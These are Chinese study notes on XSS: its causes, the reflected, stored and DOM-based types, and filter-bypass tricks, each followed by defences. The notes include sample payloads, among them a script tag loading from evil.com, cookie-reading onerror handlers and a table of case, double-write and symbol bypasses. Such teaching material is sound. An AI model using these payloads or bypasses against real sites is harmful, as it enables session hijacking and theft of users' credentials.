
# XSS漏洞

## 补：浏览器工作流程简介
浏览器工作流程是==从在地址栏输入网址到页面最终呈现在屏幕上的完整过程，主要包含导航、网络请求、解析构建和渲染绘制四个核心阶段==


1. ==导航阶段 (Navigation)==

- **用户输入**：用户在地址栏输入 URL 或点击链接。
- **浏览器进程处理**：UI 线程解析输入内容，判断是搜索词还是有效网址。如果是网址，开始发起网络请求。 [[1](https://developer.mozilla.org/zh-CN/docs/Web/Performance/Guides/How_browsers_work), [2](https://juejin.cn/post/7591744411739635712)]

2. ==网络请求阶段 (Network)==

- **DNS 解析**：将域名转换为服务器的 IP 地址。
- **建立连接**：通过 TCP 三次握手与服务器建立连接，若使用 HTTPS 则进行 TLS 握手。
- **发送请求**：向服务器发送 HTTP 请求，并接收服务器返回的 HTML 数据。 [[1](https://juejin.cn/post/7330550819828695050)]

3. ==解析与构建阶段 (Parsing & Building)==

- **生成 DOM 树**：渲染进程的主线程解析 HTML 代码，将其转化为文档对象模型 (DOM)。
- **生成 CSSOM 树**：解析 CSS 样式，构建层叠样式表对象模型 (CSSOM)。
- **执行 JavaScript**：若遇到 `<script>` 标签，主线程会暂停解析并执行 JS 代码，因为 JS 可能会修改 DOM 或 CSSOM。 [[1](https://juejin.cn/post/7591744411739635712)]

4. ==渲染与绘制阶段 (Rendering & Painting)==

- **构建渲染树 (Render Tree)**：将 DOM 和 CSSOM 结合，生成可见元素的布局树。
- **布局 (Layout/Reflow)**：计算每个元素在屏幕上的确切位置和大小。
- **绘制 (Paint)**：将元素的像素信息提交给合成线程，最终显示在屏幕上











JavaScript的强大能力:
- 操作DOM：可以读取、修改、删除页面上的任何内容
- 访问Cookie/Session：可以读取当前网站的Cookie，而Cookie往往
包含了用户的登录凭证。
- 发起网络请求（`AJAX/Fetch`）：可向其他服务器发送数据。

## xss攻击简介
XSS（跨站脚本攻击，Cross-Site Scripting）是 Web 安全中最常见的漏洞之一。==为了与层叠样式表（CSS）区分，行业通常将其简称为 XSS==

XSS 的核心本质是“==代码与数据边界混淆==”：当 Web 应用程序未对用户输入进行严格过滤或输出转义时，攻击者可将恶意的客户端脚本（通常是 JavaScript）注入到网页中。当其他用户浏览该页面时，浏览器无法区分该脚本是网站原本的代码还是恶意注入的数据，从而在用户的浏览器上下文中直接执行恶意脚本

==XSS 的常见攻击危害==

- **窃取用户敏感凭证**：通过 `document.cookie` 或 `localStorage` 读取用户的 Session ID / Token，实现**会话劫持（Session Hijacking）**。
    
- **伪造用户身份执行操作**：在受害者不知情的情况下，以其登录身份发送私信、关注账号、修改密码甚至进行资金转账。
    
- **界面劫持与钓鱼**：通过修改 DOM 结构注入伪造的登录弹窗，诱骗用户重新输入账号密码。
    
- **传播 XSS 蠕虫**：恶意脚本在执行时自动将自身复制并发帖/私信，实现指数级自我扩散。
    
- **键盘记录与挂马**：监听用户的按键输入（Keylogger），或重定向至恶意挂马网站






XSS攻击发生时，攻击者可以在受害者的设备上执行任
意JavaScript脚本，进而可能导致：

1、Cookie等敏感信息被盗取

2、冒充用户执行操作

3、网页挂马（引导用户下载木马）

4、破坏页面正常布局和功能





==xss漏洞产生的原因==
XSS 产生的根本原因，是==**浏览器无法区分传入的数据到底是“普通文本内容”还是“可执行的指令代码”**==。在 Web 运行机制中，HTML 结构、JavaScript 脚本与业务数据混杂在同一个文本流中传输与解析，一旦程序未能在“数据进入”与“数据输出渲染”的节点建立清晰的边界，恶意数据就会被浏览器的 HTML/DOM 解析器误当成代码执行



1. ==本质原因：代码与数据的边界混淆==

浏览器的渲染引擎采用状态机来解析 HTML 文本流。当遇到特殊控制字符（如 `<`、`>`、`"`、`'` 等）时，解析器会自动从“数据状态（Data State）”切换至“标签开启状态（Tag Open State）”或“属性状态（Attribute State）”。

如果应用程序直接将不可信数据拼接进 HTML 文本，攻击者即可利用控制字符闭合当前标签或属性，强行诱导浏览器状态机切换为脚本解析上下文（如进入 `<script>` 或 `on*` 事件处理器）



2. ==编码与转义缺陷（最常见的开发失误）==

忽视“上下文敏感性”（Context-Blind Escaping）

不同 HTML 上下文需要的转义规则完全不同，开发者常误以为“做了一次 HTML 实体转义”就安全了：



|**插入上下文**|**典型代码片段**|**错误转义导致的漏洞原因**|**正确处理方式**|
|---|---|---|---|
|**HTML 正文**|`<div>$var</div>`|仅做简单字符串替换，漏掉 `<` 或 `>`|标准 HTML 实体转义（`<` 转为 `&lt;` 等）|
|**HTML 属性**|`<input value="$var">`|未给属性加双引号，或未转义 `"` / `'` / 空格|属性加双引号 + 属性实体转义|
|**JavaScript 作用域**|`<script>var name = '$var';</script>`|仅做了 HTML 实体转义，攻击者使用 `'; alert(1); //` 闭合|Unicode 转义或标准的 `JSON.stringify()` 序列化|
|**URL 属性**|`<a href="$var">Link</a>`|转义了 HTML 特殊字符，但未校验协议头|必须校验协议白名单（严格限制为 `http://`、`https://`），拦截 `javascript:` 伪协议|
依赖“黑名单过滤”而非“白名单验证”

许多系统尝试通过正则替换或黑名单拦截 XSS，但黑名单极易被绕过：

- 忽略大小写混淆（如 `<ScRiPt>`）
    
- 利用不依赖 `<script>` 的标签（如 `<img src=x onerror=...>`、`<svg onload=...>`、`<video onerror=...>`）
    
- 利用未闭合标签或容错解析（如 `<iframe src="javascript:alert(1)"`）
    
- 利用多重编码或畸形字符绕过正则匹配




3. ==前端 DOM 操作与危险 API 的不当使用==

随着单页应用（SPA）的普及，大量渲染逻辑转移到了前端 JavaScript 中。DOM 型 XSS 的产生主要归结于前端将不可控的“输入源（Source）”未经清洗直接传递给了“危险执行槽（Sink）”：

- **直接解析 HTML 的 API**：频繁使用 `element.innerHTML`、`element.outerHTML`、`document.write()` 动态插入内容。
    
- **动态代码执行 API**：使用 `eval()`、`new Function()`、`setTimeout("code", delay)` 解析并运行包含动态数据的字符串。
    
- **滥用现代框架的逃生通道**：
    
    - React 中的 `dangerouslySetInnerHTML`
        
    - Vue 中的 `v-html`
        
    - Angular 中的 `bypassSecurityTrustHtml` 现代框架默认会进行文本转义，但一旦开发者通过上述指令绕过框架保护，便直接引入了 XSS 风险



4. ==业务场景的天然矛盾：富文本需求==

在论坛发帖、博客编辑、邮件系统和 CMS 内容管理等场景下，业务必须允许用户提交格式化的 HTML 标签（如加粗 `<b>`、段落 `<p>`、排版表格等）。

此时无法对所有标签进行简单的实体转义，必须在“允许合法排版标签”与“剔除恶意代码”之间做平衡。如果开发者自行编写简易正则去过滤危险标签，极难覆盖 HTML 规范中庞杂的事件属性和深层嵌套语法，从而导致攻击者能够构造出畸形但合法的恶意 Payload




5. ==架构与纵深防御缺失==

漏洞即使在局部代码产生，如果系统具备完善的防御层级，危害也能被大幅遏制。XSS 最终造成实质破坏，通常还伴随着以下安全机制的缺失：

- **未设置 Cookie 的 `HttpOnly`**：允许前端脚本读取会话 Cookie，导致 XSS 攻击直接升级为账号劫持。
    
- **缺乏内容安全策略（CSP）**：服务器未配置 `Content-Security-Policy` 响应头，浏览器允许任意执行内联脚本（Inline Script）或向未知第三方域发起数据外发请求。
    
- **前后端职责不清与模板引擎缺乏自动转义**：部分老旧服务端模板引擎默认不开启自动上下文转义（Auto-escaping），需要开发者手动逐处添加转义函数，极易因疏忽造成遗漏










导致XSS攻击的原因大多是因为对用户输入的数据没有做好过滤，并且
对输出的内容没有进行有效的转义操作。


将用户传入的数据原样输出的示例：
```
<!--正常输入:-->
https://site.com/search?q=苹果
<--页面显示：您搜索了“苹果-->
```

```
<--恶意输入：->
https://site.com/search?q=<script>alert('你被xSS了!');</script>
<！-如果未过滤，页面会执行这个警告弹窗->
```







## 反射型xss攻击
**反射型 XSS（Reflected Cross-Site Scripting，==非持久型 XSS==）** 是一种常见的 Web 安全漏洞。当应用程序接收来自 HTTP 请求中的不安全输入，并将其**未经充分过滤或转义立即包含在响应页面**中返回给浏览器时，就会触发该漏洞


与存储型 XSS 不同，反射型 XSS 的恶意代码**不会保存在服务器数据库中**，它像镜子一样，请求中的恶意脚本经由服务器“反射”回受害者的浏览器执行

==攻击流程剖析==

反射型 XSS 通常依赖**社会工程学**（如钓鱼邮件、虚假链接），诱导受害者主动触发请求。

**1.攻击者构造恶意 URL：**将脚本注入到请求参数中。
攻击者发现目标网站存在反射漏洞后，构造一个包含 JavaScript 代码的特制链接（如利用 URL 参数传递 Payload）。

**2.诱导受害者点击链接：**常结合钓鱼或即时通讯工具传播。
攻击者通过邮件、论坛或社交平台将链接发送给受害者，利用欺骗性文本或短链接伪装，诱导目标点击。

**3.目标服务器处理请求并反射代码：**
受害者点击链接后向正常服务器发起请求。服务器读取参数并将其拼接入 HTML 页面中，但未进行 HTML 转义，直接作为响应返回。

**4.受害者浏览器执行恶意脚本：**
浏览器接收到响应内容，无法区分恶意脚本与正常页面代码，直接解析并执行注入的 JavaScript。

**5.敏感数据泄露或被劫持：**
恶意脚本在受害者浏览器上下文中运行，读取 `document.cookie`、LocalStorage 或捕获键盘输入，并将数据静默发送到攻击者控制的接收端

==防御方案==

==防御反射型 XSS 遵循“**输入验证 + 上下文输出编码 + 纵深防御**”的原则：==

1. **上下文感知的输出编码（最核心）** 在向 HTML 页面输出任何动态数据时，必须将其转换为安全的实体编码。例如在将变量放入 HTML 文本时：
    
    - `<` 转换为 `&lt;`
        
    - `>` 转换为 `&gt;`
        
    - `&` 转换为 `&amp;`
        
    - `"` 转换为 `&quot;`
        
    - `'` 转换为 `&#x27;` 现代前端框架（如 React、Vue、Angular）默认在模板渲染时会做 HTML 实体转义，可极大规避该问题

2. **为敏感 Cookie 设置 `HttpOnly`**

3. **配置内容安全策略（CSP）** 通过 HTTP 响应头限制脚本的加载来源，禁止执行内联脚本与 `eval`

4. **严格的输入验证与类型约束** 对数字、枚举型参数进行强类型校验；对于预期为 URL 的参数，验证协议仅允许 `http://` 或 `https://`，防止 `javascript:` 伪协议执行

## 存储型xss攻击
**存储型 XSS（Stored XSS，又称持久型 XSS）** 是跨站脚本攻击中最具破坏力的一种形式。==当 Web 应用程序将用户输入的未经过滤或转义的恶意脚本**永久保存到了服务器端数据库、文件系统或缓存**中，并在随后的页面渲染中直接将该内容展示给其他正常访问的用户时，就会触发该漏洞==



与反射型 XSS 仅作用于点击特定链接的单个受害者不同，存储型 XSS 的攻击代码常驻在服务器上，任何正常浏览包含该数据页面的用户都会被动中招

==攻击流程拆解==

存储型 XSS 的核心在于“一次提交，持续感染”，攻击者无需诱导目标点击包含恶意的 URL，只需等待受害者正常访问受污染页面：

**1.攻击者提交带有 Payload 的内容：** 将恶意脚本注入持久化存储。
攻击者在论坛发帖、商品评价、个人简介或留言板等输入框中，输入精心构造的 JavaScript 脚本（如 `<script src="[http://evil.com/hook.js](http://evil.com/hook.js)"></script>`）并提交。

**2.服务器将恶意数据持久化入库：** 服务端未对输入做有效清洗与校验。
后端程序直接将包含恶意代码的数据存入 MySQL、MongoDB 或 Redis 等数据库中。

**3.受害者访问包含恶意数据的页面：** 常规用户甚至管理员正常浏览网站。
其他用户（或网站管理员）正常打开该文章、查看评论列表或进入后台管理系统审核内容。

**4.服务器从数据库读取数据并拼接输出：** 服务端未做 HTML 实体转义。
服务器从数据库中取出被污染的数据，直接拼接到 HTML 响应体中返回给前端。

**5.受害者浏览器解析并执行恶意脚本：** 在受害者的会话上下文中触发。
受害者的浏览器将包含在 HTML 中的脚本标签当作合法代码解析执行，攻击者可在受害者毫无察觉的情况下劫持会话、操作账户或盗取敏感信息

==典型高危危害==

1. **管理后台沦陷与权限提升**：攻击者在用户端留言注入代码，当管理员登录后台审核留言时，脚本在管理员浏览器运行，导致后台 Token 泄露或直接以管理员身份发起创建超级管理员账号的请求。
    
2. **XSS 蠕虫（自繁殖攻击）**：恶意脚本在受害者浏览器执行后，利用其已登录状态自动在受害者账号下发表带有同样 Payload 的动态/私信，实现病毒式指数级扩散（如经典的 Myspace Samy 蠕虫）。
    
3. **敏感信息与按键劫持**：在页面中挂载 Keylogger 脚本，实时监听并回传受害者的账号密码、信用卡号或聊天内容




==防御与修复方案==

防御存储型 XSS 必须坚持“**入库校验 + 出库转义 + 纵深防御**”的立体防御架构：


1. 上下文感知的 HTML 实体转义（核心）

从数据库取出数据并输出到 HTML 页面时，必须对动态内容进行 HTML 编码：

- `<` 编码为 `&lt;`
    
- `>` 编码为 `&gt;`
    
- `&` 编码为 `&amp;`
    
- `"` 编码为 `&quot;`
    
- `'` 编码为 `&#x27;`
    

> **注意：** 现代前端框架（如 React 的 `{data}`、Vue 的 `{{ data }}`）默认具备出库转义能力，但要**严禁**随意使用 `v-html` 或 `dangerouslySetInnerHTML`


2. 富文本的白名单过滤（针对富文本场景）

如果业务确实允许用户输入富文本（如博客、编辑器支持 `<b>`、`<img>`、`<a>` 等）：

- **绝不能用黑名单过滤** `<script>`，因为攻击者可用 `<img src=x onerror=alert(1)>`、`<svg onload=...>` 等绕过。
    
- 使用经过安全审计的**白名单 HTML 清洗库**，如前端的 **DOMPurify** 或后端的 **Bleach**、**Jsoup**



3. 会话保护与内容安全策略 (CSP)

- **开启 Cookie 的 `HttpOnly` 标志**：防止 JavaScript 读取敏感的身份凭据，切断窃取 Cookie 链条。
    
- **部署 CSP (Content Security Policy)**：在 HTTP 响应头中配置严格的脚本源策略，禁用内联脚本 (`unsafe-inline`) 与动态 `eval`

## DOM型xss攻击
**DOM 型 XSS（DOM-based Cross-Site Scripting）** 是一种==完全发生在客户端（浏览器端）的跨站脚本漏洞==


与反射型和存储型 XSS 不同，==DOM 型 XSS 的恶意代码**无需经过服务器端的解析或拼接回显**。漏洞的根源在于：前端 JavaScript 代码从不受信任的“数据源（Source）”读取用户输入，随后未经充分转义或清洗==，直接将数据传递给危险的“执行接收点（Sink）”，导致浏览器动态修改了 DOM 结构并执行了攻击者注入的恶意脚本


例：

==核心机制：Source（源）与 Sink（接收点）==

DOM 型 XSS 的本质是数据从 **Source** 流向了危险的 **Sink**：

- **Source（输入源）**：攻击者能够控制或影响的前端输入属性。
    
- **Sink（接收点/沉点）**：将传入的字符串当作 HTML、JavaScript 代码或可执行资源进行解析的 Web API。
    

|**类别**|**常见属性 / API**|**风险说明**|
|---|---|---|
|**常见 Source**|`location.hash`<br><br>  <br><br>`location.search`<br><br>  <br><br>`location.pathname`<br><br>  <br><br>`document.referrer`<br><br>  <br><br>`window.name`<br><br>  <br><br>`message` (postMessage)|攻击者可通过 URL 参数、Hash 片段或跨窗口通信直接传入恶意 Payload。|
|**DOM 写入类 Sink**|`element.innerHTML`<br><br>  <br><br>`element.outerHTML`<br><br>  <br><br>`document.write()`<br><br>  <br><br>`document.writeln()`|将字符串直接解析为 HTML 节点，触发标签内的脚本或事件处理器。|
|**代码执行类 Sink**|`eval()`<br><br>  <br><br>`setTimeout(string, ...)`<br><br>  <br><br>`setInterval(string, ...)`<br><br>  <br><br>`new Function(string)`|直接将输入作为 JavaScript 代码动态编译并执行。|
|**URL 跳转与加载类 Sink**|`location.href`<br><br>  <br><br>`location.assign()`<br><br>  <br><br>`location.replace()`<br><br>  <br><br>`element.src`<br><br>  <br><br>`element.href`|若未校验协议，可被注入 `javascript:` 伪协议或重定向至钓鱼站点。|




==攻击流程剖析==

DOM 型 XSS 最显著的特征在于其**隐蔽性**，==特别是利用 URL Hash（`#`）片段进行的攻击，恶意 Payload 甚至完全不会发送到后端服务器。==

**1.攻击者构造特制前端链接：** 将 Payload 藏于 URL Hash 或 Query 中。
攻击者利用页面的客户端逻辑缺陷构造 URL，例如在 Hash 片段中加入 Payload：`[https://example.com/user#](https://example.com/user#)<img src=x onerror=alert(document.cookie)>`。

**2.诱导受害者在浏览器中打开链接：** 通过社工方式传播链接。
受害者点击该链接，向正常服务器发起 HTTP 请求。

**3.服务器返回正常的静态 HTML/JS：** HTTP 请求可能完全不含恶意 Payload。
根据 HTTP 规范，浏览器发起的请求头和路径中**不包含 `#` 之后的 Hash 内容**。服务器返回的是一份完全合法的模板文件或静态脚本。

**4.浏览器端 JavaScript 动态解析并触发：** 前端 JS 自动读取 Source 并写入 Sink。
客户端脚本执行，读取 `window.location.hash` 并直接赋值给 `element.innerHTML`。

**5.恶意代码在受害者上下文中执行：** DOM 树被恶意篡改。
浏览器根据注入的内容重新渲染 DOM 树，触发 `onerror` 等事件回调，恶意脚本获取到用户的本地 Cookie、Token 或篡改页面内容

## 使用大小写绕过执行xss攻击
大小写绕过（Mixed-Case Bypass）是一种针对==**区分大小写的黑名单过滤机制**的 XSS 攻击技巧==。其==核心利用了 **HTML 解析器对标签名、属性名及协议头的不区分大小写特性**，与 **后端过滤代码未进行大小写规范化（Case Normalization）或正则匹配未设置忽略大小写标志（`/i`）** 之间的差异==


1. ==漏洞产生原理==

浏览器端解析特性（不区分大小写）

根据 HTML 规范，HTML 标签、属性名以及伪协议在浏览器 DOM 树构建与解析过程中均**不区分大小写**。以下形式在浏览器中具有完全等价的解析效果：

- `<script>` $\leftrightarrow$ `<sCrIpt>` $\leftrightarrow$ `<SCRIPT>`
    
- `onerror` $\leftrightarrow$ `oNeRrOr` $\leftrightarrow$ `ONERROR`
    
- `javascript:` $\leftrightarrow$ `JaVaScRiPt:` $\leftrightarrow$ `JAVASCRIPT:`


==后端过滤缺陷（区分大小写）==

许多简陋的过滤机制或正则表达式直接针对小写字符串进行匹配或替换：

- **不完善的字符串匹配**：如 Python 中的 `if "script" in user_input:`、PHP 中的 `str_replace("<script>", "", $input)`、Java 中的 `input.contains("<script>")`。
    
- **缺少修饰符的正则表达式**：如 `/<\/?script>/`（未添加 `/i` 忽略大小写修饰符）。
    

当用户提交 `<sCrIpt>` 时，后端的匹配条件判定为 `false`，从而放行恶意载荷，而浏览器接收后依然将其解析为有效的脚本执行



2. ==典型利用场景与 Payload 示例==

- 标签名大小写混淆

适用于后端仅拦截 `<script>`、`<iframe>`、`<img>` 等标准小写标签的场景：

3. ==关键注意事项：HTML 上下文 vs. JavaScript 上下文==

使用大小写绕过时，必须区分 **HTML 解析层** 和 **JavaScript 执行层**：

|**上下文**|**是否区分大小写**|**影响说明**|
|---|---|---|
|**HTML 标签名** (`<SCRIPT>`)|**否**|可以随意混淆大小写|
|**HTML 属性名** (`OnErRoR`)|**否**|可以随意混淆大小写|
|**URL 协议头** (`JaVaScRiPt:`)|**否**|可以随意混淆大小写|
|**JavaScript 语法/函数** (`alert`)|**是**|**不能混淆**。若写成 `Alert(1)` 或 `ALERT(1)`，JS 引擎会抛出 `ReferenceError: Alert is not defined`|

>**有效 Payload**：`<sCrIpT>alert(1)</sCrIpT>` （HTML 不区分，JS 正确执行）
>**无效 Payload**：`<script>ALERT(1)</script>` （JS 区分大小写，函数调用失败）





4. ==防御与修复方案==
---

1. **统一输入规范化（若使用模式匹配）**：
    
    在做任何特征检测前，先将输入统一转为小写（如 `input.toLowerCase()`），并使用带 `/i` 标志的正则匹配。

2. **弃用黑名单，采用上下文相关的输出编码**：
    
    对 HTML 正文上下文中的字符转义为实体：
    
    - `<` $\rightarrow$ `&lt;`
    - `>` $\rightarrow$ `&gt;`
    - `"` $\rightarrow$ `&quot;`
    - `'` $\rightarrow$ `&#x27;`
    - `&` $\rightarrow$ `&amp;`

3. **使用标准 HTML 清洗库**：
    
    对于必须支持富文本渲染的场景，使用如 **DOMPurify** 等经过严格测试的解析库，这些库在 DOM 树层面进行白名单过滤，天然免疫大小写混淆。

4. **部署内容安全策略（CSP）**：
    
    通过配置严格的 `Content-Security-Policy`（禁止 `unsafe-inline`），即使标签被成功解析，浏览器也会拒绝执行内联脚本与伪协议

## 使用重写绕过(双写绕过)执行xss攻击
重写绕过（又称**双写绕过**、**嵌套绕过**）是一种针对==**单次非递归黑名单过滤机制**的 XSS 攻击技巧==。其核心==利用了后端在对敏感关键字进行剔除或替换时，仅执行了一次匹配删除，导致被拆分在两侧的代码片段在删除后重新拼接为一个完整的恶意指令==


1. ==漏洞产生原理==

当后端安全过滤逻辑采用类似 `str_replace`、`replace()` 或单次正则表达式将危险关键词直接替换为空字符 `""`，且**未采用递归清理**时，就会产生该漏洞

拼接过程演示：

假设后端过滤规则为：`input.replace(/script/gi, "")`

1. 攻击者构造 Payload：`<scr<script>ipt>alert(1)</script>`
    
2. 后端检测到中间包含完整的 `script`，将其替换为空：
    
    $$\text{"<scr"} + \xcancel{\text{"<script>"}} + \text{"ipt>..."} \longrightarrow \text{"<script>..."}$$
    
3. 替换完成后，残余的 `scr` 与 `ipt` 闭合重组，变成了全新的 `<script>` 标签输出到页面中，被浏览器正常解析执行


---
2. ==常见利用场景与示例==

- 标签名双写
当后端过滤目标为特定的 HTML 标签名（如 `script`、`img`、`svg`、`iframe` 等）时

3. ==双写绕过的局限性与失效场景==

双写绕过在以下防御机制下会直接失效：

|**防御方式**|**为何能防御双写**|
|---|---|
|**HTML 实体编码**|直接将 `<`, `>`, `"`, `'`, `&` 转义为实体，浏览器将其视为文本而非标签，无需依赖关键字匹配。|
|**DOM / AST 树解析过滤**|如 `DOMPurify`，在 DOM 树层面进行语法树解析与白名单剔除，而非基于原始字符串做简单的正则替换。|
|**递归式循环剔除**|后端使用 `while` 循环不断剔除关键字直到不存在为止（_注：若编写不当可能引发 ReDoS 性能问题_）。|
|**白名单校验**|仅允许预定义的合法字符集或标签，其余全部丢弃。|

1. **废弃“黑名单字符串替换”模式**：

2. **上下文相关的输出编码（Context-Aware Output Encoding）**：
    
    - 在 HTML 正文上下文中，转义特殊字符：
        
        - `<` $\rightarrow$ `&lt;`
            
        - `>` $\rightarrow$ `&gt;`
            
        - `"` $\rightarrow$ `&quot;`
            
        - `'` $\rightarrow$ `&#x27;`
            
        - `&` $\rightarrow$ `&amp;`

3. **富文本场景使用成熟的 Sanitizer**：
    
    如果业务必须支持富文本渲染（如文章发布、评论区富文本），应引入业界经过严格审计的白名单清洗库（如前端 **DOMPurify**，后端 **sanitize-html** 或 **Bleach**）。

4. **配合严格的内容安全策略（CSP）**：
    
    设置响应头 `Content-Security-Policy: default-src 'self'; script-src 'self'`，禁止内联脚本执行与 `javascript:` 伪协议

## 使用符号绕过法执行xss攻击
**符号绕过法**是指在 XSS 测试中，当目标环境对特定关键字符（如空格、括号、引号、尖括号、斜杠、点号等）设置了过滤规则或 WAF 拦截时，==利用 **HTML/JavaScript 语法特性、DOM 规范解析机制以及控制字符** 来替代目标字符，从而实现代码执行的技巧==


1. ==绕过空格过滤（Space Bypasses）==

当后端过滤了空格（ ）或将空格替换为空时，可以利用 HTML 解析器允许的合法属性分隔符进行替代。


- ==使用斜杠 `/` 替代空格==

HTML 解析器在遇到标签名结束后的 `/` 时，会将其作为标签与属性或属性之间的自然分隔符：

- 使用空白控制字符（URL/十六进制编码）

浏览器在解析 HTML 标签内部时，将部分控制字符视作等效的空白符：

- **Tab 制表符**（`%09` / `&#x09;`）
    
- **换行符 LF**（`%0a` / `&#x0A;`）
    
- **回车符 CR**（`%0d` / `&#x0D;`）
    
- **换页符 FF**（`%0c` / `&#x0C;`）

==常见符号替代方案速查表==

|**被过滤字符**|**替代方案 / 绕过技术**|**典型 Payload 示例**|
|---|---|---|
|**空格 ( )**|`/`、`%0a`、`%09`、`%0c`|`<svg/onload=alert(1)>`|
|**圆括号 (`()`)**|反引号 `` ` ``、`throw + onerror`|``<img src=x onerror=alert`1`>``|
|**单/双引号 (`'` / `"`)**|反引号、`/regex/.source`、`String.fromCharCode`|`<img src=x onerror=alert(/xss/.source)>`|
|**点号 (`.`)**|中括号 `[]`、`with()` 作用域扩展|`<img src=x onerror="with(document)alert(cookie)">`|
|**尖括号 (`<>`)**|属性闭合、运算符拼接（针对已有上下文）|`';alert(1);//`|




==防御与修复建议==

1. **废弃单纯的特殊字符黑名单过滤**： 黑名单过滤极易因编码变形、解析差异以及新语言特性的引入而被绕过。

2. **严格的上下文输出编码（Context-Aware Output Encoding）**：
    
    - **HTML 文本上下文**：转义 `&`, `<`, `>`, `"`, `'` 为对应的 HTML 实体（如 `&lt;`, `&gt;`）。
        
    - **JavaScript 上下文**：对动态插入 JavaScript 变量的数据进行严格的 JSON 序列化（`json_encode` / `JSON.stringify`），或将特殊符号转义为 Unicode 编码（如 `\u0027`, `\u0022`）。

3. **启用严格的内容安全策略（CSP）**： 配置 `Content-Security-Policy: default-src 'self'; script-src 'self'`，禁止内联执行（`unsafe-inline`）和 `eval`/`setTimeout` 动态代码解析

1. 空格 -> `/`
2. 单双引号 -> `\' \"`
3. 圆括号 -> `noerror`配合`throw`
4. ==关键字过滤 -> `eval`函数==
